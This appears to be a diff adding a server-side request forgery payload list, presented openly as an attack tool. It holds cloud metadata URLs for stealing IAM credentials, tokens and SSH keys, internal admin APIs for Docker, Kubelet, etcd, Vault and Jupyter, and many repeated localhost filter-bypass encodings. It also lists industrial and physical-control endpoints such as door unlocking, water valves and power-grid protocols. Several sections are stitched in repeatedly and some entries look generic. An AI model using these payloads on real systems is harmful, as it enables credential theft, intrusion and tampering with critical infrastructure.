+http://localhost:10250/metrics           # Kubelet Metrics
+http://localhost:8200/v1/sys/leader      # Vault Cluster Info
+http://localhost:8500/v1/status/peers    # Consul Peers
+
+# Ultimate Bypasses
+http://0/
+http://127.1
+http://0177.0.0.1
+http://2130706433
+http://[::1]
+http://127.0.0.1.nip.io
+http://spoofed.burpcollaborator.net
+
+# Database & Cache (Deep Ports)
+http://localhost:5984/_all_dbs           # CouchDB
+http://localhost:8983/solr/#/            # Apache Solr
+http://localhost:6379/info               # Redis Status
+http://localhost:11211/stats             # Memcached
+http://localhost:8080/ais/v1/targets         # نظام تتبع السفن (AIS)
+http://localhost:9000/adsb/status            # تتبع الطائرات (ADS-B)
+http://localhost:8081/radar/diagnostic       # واجهة تشخيص الرادار
+http://127.0.0.1:4000/arinc/config           # بروتوكولات الطيران المدني
+http://localhost:80/hvac/control             # نظام التكييف المركزي
+http://localhost:8080/elevator/api/v1        # نظام التحكم بالمصاعد
+http://localhost:9000/lighting/status        # نظام الإضاءة الذكي
+http://127.0.0.1:5000/access/door/unlock     # فتح الأبواب الإلكترونية
+# Cloud & Container Deep Dive
+http://169.254.169.254/computeMetadata/v1/instance/attributes/api-key
+http://169.254.169.254/latest/meta-data/iam/security-credentials/ASAPP-Role
+http://localhost:10248/healthz               # Kubelet Internal
+http://localhost:2375/v1.41/images/json      # Docker Image List
+
+# Obscure Infrastructure
+http://localhost:8888/api/v1/proxy/          # Jupyter/Dashboard Proxy
+http://localhost:8081/nexus/service/local/   # Sonatype Nexus
+http://localhost:8000/minio/admin/v3/info    # MinIO Admin
+http://localhost:9001/                       # Supervisor Control
+
+# Ultimate Evasion
+http://0/
+http://127.1
+http://2130706433
+http://0x7f.1
+http://0177.0.0.1
+http://[::1]
+http://127.0.0.1.nip.io
+http://localtest.me
+http://localhost:8080/scada/api/v1/health
+http://localhost:8000/plc/config.xml         # واجهة التحكم بالمنطق المبرمج
+http://localhost:502/status                  # Modbus TCP Gateway
+http://127.0.0.1:4840/server                 # OPC UA (Industrial IoT)
+http://localhost:8080/biometric/sync
+http://localhost:9000/surveillance/stream
+http://127.0.0.1:8181/v1/api/identity
+http://localhost:8081/pki/internal/sign      # نظام توقيع الشهادات الرقمية
+# Cloud Edge & Microservices
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/0/vpc-id
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys
+http://100.100.100.200/latest/meta-data/identity/ # Alibaba Special
+http://localhost:10250/pods/                  # Kubelet Secret Access
+
+# Obscure Infrastructure
+http://localhost:9090/api/v1/admin/tsdb/snapshot # Prometheus Dump
+http://localhost:8500/v1/kv/?recurse          # Consul Key-Value store
+http://localhost:2379/v2/keys                 # etcd Cluster database
+http://localhost:8888/api/kernels             # Jupyter Kernel RCE
+
+# Ultimate Evasion
+http://0/
+http://127.1
+http://[::1]
+http://0x7f.1
+http://0177.0.0.1
+http://127.0.0.1.nip.io
+http://127.0.0.1.bc.googleusercontent.com
+http://localhost:623/                 # IPMI over HTTP
+http://localhost:443/cgi/login.php    # iDRAC (Dell Remote Access)
+http://localhost:80/adv_login.php     # HP iLO (Integrated Lights-Out)
+http://localhost:80/screen.html       # Avocent KVM over IP
+http://localhost:8080/api/v1/satellite/modem/status
+http://localhost:9000/rf/signal/telemetry
+http://localhost:8081/dish/azimuth/control
+http://127.0.0.1:5000/gps/position/metadata
+# Secret Infrastructure & Orchestration
+http://localhost:2376/v1.41/containers/json   # Docker TLS Port (Internal)
+http://localhost:10255/metrics/cadvisor       # Kubelet Container Stats
+http://localhost:8200/v1/sys/config/state     # HashiCorp Vault Secrets
+http://localhost:9093/#/alerts                # Prometheus Alertmanager
+
+# Ultimate Bypasses (The Unbeatables)
+http://0/
+http://127.1
+http://[::1]
+http://0x7f.1
+http://0177.0.0.1
+http://127.0.0.1.nip.io
+http://customer-metadata.google.internal/     # Google Cloud Secret Path
+
+# Database Management (Deep Internals)
+http://localhost:8091/pools/default/buckets   # Couchbase API
+http://localhost:8983/solr/admin/info/threads # Apache Solr Debug
+http://localhost:5984/_membership             # CouchDB Cluster
+http://localhost:8080/api/v1/grid/lights     # التحكم في إنارة الشوارع
+http://localhost:9001/water/valve/status     # التحكم في صمامات المياه
+http://127.0.0.1:8081/traffic/cam/config     # إعدادات كاميرات المرور
+http://localhost:5000/parking/gate/open      # بوابات المواقف الذكية
+http://localhost:8080/modbus/v1/diagnostics
+http://localhost:4840/opcua/server/status    # بروتوكول التصنيع الموحد
+http://127.0.0.1:2404/iec104/control         # بروتوكول التحكم في محطات الكهرباء
+http://localhost:1883/mqtt/status            # (إذا كان يدعم WebSockets/HTTP)
+# Deep Infrastructure & Secrets
+http://localhost:15672/api/overview          # RabbitMQ Management
+http://localhost:11080/                      # MailHog (لصيد إيميلات الموظفين)
+http://localhost:8161/admin/queues.jsp       # ActiveMQ Admin
+http://localhost:61616/                      # Apache ActiveMQ Default
+
+# The "Invisible" Bypasses
+http://0/
+http://127.1
+http://2130706433
+http://[::1]
+http://0x7f000001
+http://127.0.0.1.nip.io
+http://127.0.0.1.xip.io
+
+# Cloud/Metadata (Hidden Paths)
+http://169.254.169.254/latest/user-data      # (يحتوي غالباً على باسووردات السكربتات)
+http://169.254.169.254/latest/meta-data/public-keys/0/openssh-key
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://localhost:8080/api/v1/border/gate/open
+http://localhost:9000/biometrics/face/verify
+http://localhost:8081/passport/scanner/status
+http://127.0.0.1:5000/security/logs/access
+http://localhost:8888/quantum/v1/circuit/status
+http://localhost:8000/qiskit/api/runtime
+http://127.0.0.1:9090/pennylane/metrics
+# Deep Cloud & Secrets (Latest 2026)
+http://169.254.169.254/latest/meta-data/load-balancer/target-groups
+http://metadata.google.internal/computeMetadata/v1/project/attributes/auth-token
+http://100.100.100.200/latest/meta-data/ram/security-credentials/ # Alibaba Cloud
+http://localhost:10250/pods/                  # Kubelet Secret Access
+
+# Industrial & Critical Infrastructure
+http://localhost:502/status                   # Modbus TCP (Power Grids)
+http://localhost:4840/opcua/v1/server         # OPC UA (Manufacturing)
+http://localhost:2404/iec104/diagnostics      # IEC 60870-5-104 (Electrical)
+
+# Ultimate Evasion
+http://0/
+http://127.1
+http://2130706433                             # Decimal
+http://0x7f000001                             # Hex
+http://017700000001                           # Octal
+http://[::1]                                  # IPv6 Localhost
+http://127.0.0.1.nip.io                       # DNS Wildcard
+http://localhost:8080/api/v1/vehicle/location
+http://localhost:9000/telematics/can-bus/stats
+http://127.0.0.1:8081/fleet/engine/diagnostic
+http://localhost:5000/v2x/safety/alerts
+http://localhost:8888/sat/uplink/queue
+http://localhost:8000/telemetry/packet/decode
+http://127.0.0.1:9090/orbit/prediction/v1
+# Emerging Tech & Edge Computing
+http://localhost:10000/stats                 # Envoy Proxy Admin
+http://localhost:9901/                       # Envoy Admin (Secondary)
+http://localhost:8001/status                 # Kong API Gateway
+http://localhost:15000/config_dump           # Istio Service Mesh
+
+# Ultimate Bypasses (The Survivors)
+http://0/
+http://127.1
+http://2130706433
+http://0x7f.0.0.1
+http://0177.0.0.1
+http://[::1]
+http://127.0.0.1.nip.io
+http://localtest.me
+
+# Hidden Cloud Services (2026 Update)
+http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env
+http://100.100.100.200/latest/meta-data/vpc-id # Alibaba Cloud
+http://localhost:14100/auth/admin/master/console  # Oracle Access Manager
+http://localhost:8080/auth/admin/index.html       # Keycloak Admin
+http://localhost:9000/api/v1/iam/status           # Open Policy Agent (OPA)
+http://127.0.0.1:8200/v1/auth/token/lookup-self   # HashiCorp Vault
+http://localhost:8088/cluster/nodes               # Hadoop YARN
+http://localhost:9870/dfshealth.html              # HDFS NameNode
+http://localhost:18080/                           # Spark History Server
+http://127.0.0.1:16010/master-status              # HBase Master
+http://localhost:8088/cluster/nodes               # Hadoop YARN
+http://localhost:9870/dfshealth.html              # HDFS NameNode
+http://localhost:18080/                           # Spark History Server
+http://127.0.0.1:16010/master-status              # HBase Master
+http://localhost:8008/hsm/v1/status
+http://localhost:8443/api/v1/keys/export
+http://127.0.0.1:9000/sign/health
+http://localhost:1111/crypto/admin
+http://localhost:11434/api/generate         # Ollama API
+http://localhost:8080/v1/completions        # Local LLM Server
+http://localhost:9091/metrics               # AI Model Monitoring
+http://127.0.0.1:5000/v1/chat/completions   # Local OpenAI-like API
+# Deep Infrastructure (2026 Special)
+http://localhost:2379/v3/kv/range            # etcd v3 (Kubernetes Secrets)
+http://localhost:10255/pods                  # Kubelet Read-only port
+http://localhost:8200/v1/sys/health          # HashiCorp Vault Status
+http://localhost:19999/api/v1/info           # Netdata Monitoring
+
+# Ultimate Bypasses (The "Unfilterables")
+http://0/
+http://127.1
+http://2130706433
+http://0x7f000001
+http://[::1]
+http://127.0.0.1.nip.io
+http://localtest.me
+
+# Hidden Metadata (Specific Clouds)
+http://169.254.169.254/latest/meta-data/network/interfaces/macs/0/public-ipv4s
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes
+http://100.100.100.200/latest/meta-data/instance-name # Alibaba Cloud
+# --- [ 1. Cloud Metadata Endpoints ] ---
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data
+http://metadata.google.internal/computeMetadata/v1/
+http://169.254.169.254/metadata/instance?api-version=2017-08-01
+http://100.100.100.200/latest/meta-data/
+http://169.254.169.254/metadata/v1/
+http://192.0.0.192/1.0/meta-data/
+
+# --- [ 2. Localhost & Bypass Variations ] ---
+http://127.0.0.1:80
+http://127.1
+http://localhost:80
+http://0.0.0.0:80
+http://[::1]
+http://2130706433
+http://0x7f000001
+http://017700000001
+http://127.0.0.1.nip.io
+http://localtest.me
+http://spoofed.burpcollaborator.net
+
+# --- [ 3. Containers & Orchestration ] ---
+http://localhost:2375/v1.24/containers/json
+http://localhost:10250/pods
+http://localhost:10255/metrics
+http://localhost:2379/v2/keys
+http://localhost:15000/config_dump
+http://localhost:8001/status
+
+# --- [ 4. Databases & Critical Services ] ---
+http://localhost:6379/info
+http://localhost:9200/_cat/indices
+http://localhost:5984/_all_dbs
+http://localhost:11211/stats
+http://localhost:8983/solr/admin/info/system
+http://localhost:9042/
+http://localhost:15672/api/overview
+
+# --- [ 5. Admin & Dev Tools ] ---
+http://localhost:8080/manager/status
+http://localhost:8200/v1/sys/health
+http://localhost:9090/api/
+
